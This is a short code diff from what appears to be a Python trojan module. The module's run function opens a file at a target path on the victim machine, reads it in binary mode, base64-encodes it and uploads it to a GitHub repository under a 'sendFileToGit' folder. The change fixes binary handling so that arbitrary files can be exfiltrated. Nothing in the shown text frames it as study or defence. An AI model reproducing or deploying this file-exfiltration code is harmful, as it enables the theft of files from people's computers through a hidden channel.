@@ -16,12 +16,12 @@ def connect_to_github():
 def store_module_result(data):
 	gh,repo,branch = connect_to_github()
 	remote_path= path+"sendFileToGit/"+filePath
-	repo.create_file(remote_path,"Upload file %s"%filePath, base64.b64encode(data.encode()))
+	repo.create_file(remote_path,"Upload file %s"%filePath, base64.b64encode(data))
 	return
 
 def run(**args):
 	try:
-		fich = open(TargetOSfilePath, "r")
+		fich = open(TargetOSfilePath, "rb")
 		content = fich.read()
 		fich.close()
 		store_module_result(content)
